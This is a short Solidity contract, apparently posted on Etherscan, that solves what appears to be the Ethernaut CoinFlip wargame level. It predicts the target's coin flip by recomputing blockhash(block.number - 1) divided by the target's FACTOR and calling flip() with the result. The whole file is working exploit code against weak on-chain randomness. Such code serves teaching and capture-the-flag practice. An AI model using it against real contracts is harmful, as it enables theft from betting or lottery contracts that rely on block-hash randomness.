/**
 *Submitted for verification at Etherscan.io on 2023-03-12
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface CoinFlip {
   function flip(bool _guess) external returns (bool);
}

contract CoinFlipHelper {

  address guessAddress = 0x945506555a3E816cCF103c6952c55BBc5455A56A;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  CoinFlip coinFlip;

  constructor() {
    coinFlip = CoinFlip(guessAddress);
  }

  function guess() public {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    uint256 coinFlipResult = blockValue / FACTOR;
    bool side = coinFlipResult == 1 ? true : false;

    coinFlip.flip(side);
  }
}